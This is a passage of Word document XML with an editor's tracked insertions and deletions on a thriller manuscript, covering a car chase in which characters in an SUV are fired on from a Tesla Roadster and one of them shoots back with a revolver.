        <w:r w:rsidR="004A1059">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>when</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="1516" w:author="TextVet" w:date="2016-03-18T15:49:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="004A1059">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>in a position</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> perpendicular </w:t>
      </w:r>
      <w:ins w:id="1517" w:author="TextVet" w:date="2016-03-18T15:48:00Z">
        <w:r w:rsidR="004A1059">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>to</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="1518" w:author="TextVet" w:date="2016-03-18T15:48:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="004A1059">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>across</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> the road.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Roadster began to zip back towards them, ready to give chase in the opposite direction, back toward Tungsten.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Instead of completing the three-point turn, Jason turned the SUV in the same direction they had </w:t>
      </w:r>
      <w:del w:id="1519" w:author="TextVet" w:date="2016-03-18T15:50:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00B147C1">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve">already </w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>been driving. The electric sports car whooshed past them. A series of “</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>pop-clack!</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">” </w:t>
      </w:r>
      <w:ins w:id="1520" w:author="TextVet" w:date="2016-03-18T15:51:00Z">
        <w:r w:rsidR="005D3631">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>noises complained</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="1521" w:author="TextVet" w:date="2016-03-18T15:51:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="005D3631">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>sounds burst out</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> as the SUV pulled away and the Roadster turned around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small Asian guy in the passenger seat screamed at Tina, “Shoot back already!”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commentRangeStart w:id="1522"/>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Tina realized she still had the Russian’s revolver. The mere existence of this small gun made her stomach lurch</w:t>
      </w:r>
      <w:commentRangeEnd w:id="1522"/>
      <w:r w:rsidR="002D0774">
        <w:rPr>
          <w:rStyle w:val="CommentReference"/>
        </w:rPr>
        <w:commentReference w:id="1522"/>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>. It felt like an abomination, an obscenity cast in metal. “No,” she said flatly.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“Why the fuck not?” Moshen demanded.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“Have you ever shot a person before?” she countered.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rear window of the SUV collapsed in a shower of glass. Danny screamed and ducked.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“Give me the gun,” Moshen insisted, stretching his hand. “I’ll do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 you know how to use it?” she asked skeptically.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 gun. How hard can it be? It’s a point-and-click interface.”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low </w:t>
      </w:r>
      <w:r w:rsidR="00566952" w:rsidRPr="00566952">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:i/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:rPrChange w:id="1523" w:author="TextVet" w:date="2016-03-18T15:56:00Z">
            <w:rPr>
              <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
              <w:color w:val="000000"/>
              <w:sz w:val="24"/>
              <w:szCs w:val="24"/>
            </w:rPr>
          </w:rPrChange>
        </w:rPr>
        <w:t>“ploink!”</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> sounded from the back of the car as a bullet </w:t>
      </w:r>
      <w:ins w:id="1524" w:author="TextVet" w:date="2016-03-18T15:56:00Z">
        <w:r w:rsidR="008B77A7">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>annihilated</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="1525" w:author="TextVet" w:date="2016-03-18T15:56:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="008B77A7">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>chipped out</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> a chunk of</w:t>
      </w:r>
      <w:del w:id="1526" w:author="TextVet" w:date="2016-03-18T15:56:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="008B77A7">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve"> the</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> rear bumper.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shoved the revolver into his hand, happy to get the evil little thing away from her. “Careful with it. It’s got a hell of a kick.”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Asian kid leaned out the passenger window, trying to point the gun at the Roadster behind</w:t>
      </w:r>
      <w:del w:id="1527" w:author="TextVet" w:date="2016-03-18T15:58:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00A16342">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve"> them</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>. Jason helped him by turning sharply to the right, onto another dark side street. Moshen pulled the trigger.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Everybody in the car reflexively ducked at the overwhelming boom.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The thundering sound was immediately followed by the clatter of an object skidding across the cracked windshield and falling </w:t>
      </w:r>
      <w:del w:id="1528" w:author="TextVet" w:date="2016-03-18T16:02:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00AF39B4">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>away on</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>to the road.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asked from the back, “What the fuck was that?”</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="000D3488" w:rsidRPr="000D3488" w:rsidRDefault="00566952" w:rsidP="000D3488">
      <w:pPr>
        <w:spacing w:after="0" w:line="420" w:lineRule="atLeast"/>
        <w:ind w:firstLine="600"/>
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00566952">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:i/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:rPrChange w:id="1529" w:author="TextVet" w:date="2016-03-18T16:01:00Z">
            <w:rPr>
              <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
              <w:color w:val="000000"/>
              <w:sz w:val="24"/>
              <w:szCs w:val="24"/>
            </w:rPr>
          </w:rPrChange>
        </w:rPr>
        <w:t xml:space="preserve">“Nothing!” </w:t>
      </w:r>
      <w:del w:id="1530" w:author="TextVet" w:date="2016-03-18T16:01:00Z">
        <w:r w:rsidR="000D3488" w:rsidRPr="000D3488" w:rsidDel="001158EC">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve">said </w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidR="000D3488" w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">Moshen </w:t>
      </w:r>
      <w:ins w:id="1531" w:author="TextVet" w:date="2016-03-18T16:01:00Z">
        <w:r w:rsidR="001158EC">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>retort</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="1532" w:author="TextVet" w:date="2016-03-18T16:01:00Z">
        <w:r w:rsidR="000D3488" w:rsidRPr="000D3488" w:rsidDel="001158EC">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>defen</w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="1533" w:author="TextVet" w:date="2016-03-18T16:01:00Z">
        <w:r w:rsidR="001158EC">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>ed</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="1534" w:author="TextVet" w:date="2016-03-18T16:01:00Z">
        <w:r w:rsidR="000D3488" w:rsidRPr="000D3488" w:rsidDel="001158EC">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>sively</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidR="000D3488" w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>. “That was nothing!”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answered, “That… was the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SUV tilted as Jason swerved around a car that had the misfortune of being on the same suburban road. The innocent bystander’s horn Dopplered behind them as Jason </w:t>
      </w:r>
      <w:ins w:id="1535" w:author="TextVet" w:date="2016-03-18T16:02:00Z">
        <w:r w:rsidR="00466B86">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>seared</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="1536" w:author="TextVet" w:date="2016-03-18T16:02:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00466B86">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>desperately sped</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> down the street, the Russians in pursuit.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Jason shook his head. “I can’t out-drive them!” he said hoarsely. </w:t>
      </w:r>
      <w:ins w:id="1537" w:author="TextVet" w:date="2016-03-18T16:05:00Z">
        <w:r w:rsidR="005034C3">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t xml:space="preserve">Horrified, </w:t>
        </w:r>
      </w:ins>
      <w:del w:id="1538" w:author="TextVet" w:date="2016-03-18T16:05:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="005034C3">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>T</w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="1539" w:author="TextVet" w:date="2016-03-18T16:05:00Z">
        <w:r w:rsidR="005034C3">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>t</w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">hey watched </w:t>
      </w:r>
      <w:del w:id="1540" w:author="TextVet" w:date="2016-03-18T16:05:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="005034C3">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve">helplessly </w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>as the Roadster drew closer</w:t>
      </w:r>
      <w:ins w:id="1541" w:author="TextVet" w:date="2016-03-18T16:05:00Z">
        <w:r w:rsidR="00063AE4">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>,</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="1542" w:author="TextVet" w:date="2016-03-18T16:05:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00063AE4">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543" w:author="TextVet" w:date="2016-03-18T16:05:00Z">
        <w:r w:rsidR="00063AE4">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>t</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="1544" w:author="TextVet" w:date="2016-03-18T16:05:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00063AE4">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he</w:t>
      </w:r>
      <w:ins w:id="1545" w:author="TextVet" w:date="2016-03-18T16:05:00Z">
        <w:r w:rsidR="00063AE4">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>ir</w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:del w:id="1546" w:author="TextVet" w:date="2016-03-18T16:06:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="002259F7">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>SUV</w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="1547" w:author="TextVet" w:date="2016-03-18T16:05:00Z">
        <w:r w:rsidR="00063AE4">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>world</w:t>
        </w:r>
      </w:ins>
      <w:ins w:id="1548" w:author="TextVet" w:date="2016-03-18T16:06:00Z">
        <w:r w:rsidR="00063AE4">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t xml:space="preserve">’s </w:t>
        </w:r>
      </w:ins>
      <w:del w:id="1549" w:author="TextVet" w:date="2016-03-18T16:05:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00063AE4">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve"> fell into</w:delText>
        </w:r>
      </w:del>
      <w:del w:id="1550" w:author="TextVet" w:date="2016-03-18T16:06:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00063AE4">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve"> tense </w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">silence </w:t>
      </w:r>
      <w:ins w:id="1551" w:author="TextVet" w:date="2016-03-18T16:06:00Z">
        <w:r w:rsidR="00063AE4">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>punctuated by</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="1552" w:author="TextVet" w:date="2016-03-18T16:06:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00063AE4">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>amid</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> the rush of air through broken windows.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“Hey. Wait a minute,” said Danny. “Guys. Do you hear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“Hear what?” asked Moshen.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sound of their engine.”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listened.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said Moshen. “It’s an all-electric drive train. They don’t </w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>have</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t> an engine.”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“Exactly,” Danny said. “Jason. Get us closer.”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asked, “Closer?”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“Yeah,” </w:t>
      </w:r>
      <w:del w:id="1553" w:author="TextVet" w:date="2016-03-18T16:08:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00395D41">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>sa</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:ins w:id="1554" w:author="TextVet" w:date="2016-03-18T16:08:00Z">
        <w:r w:rsidR="00395D41">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>mplore</w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">d Danny. He peeked </w:t>
      </w:r>
      <w:del w:id="1555" w:author="TextVet" w:date="2016-03-18T16:08:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00A66B32">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve">carefully </w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>over the SUV’s rear door, through the blown-out window. The Tesla Roadster was barely a hundred feet away. “Their car is about two square meters in frontal cross-section. What’s the radius of a sphere for which a 24-decibel gain covers two square meters of surface area?”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should I know?” Jason yelled back.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“Sorry, just thinking out loud,” said Danny. He checked the lights on his machine.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“Seriously, Danny, what </w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
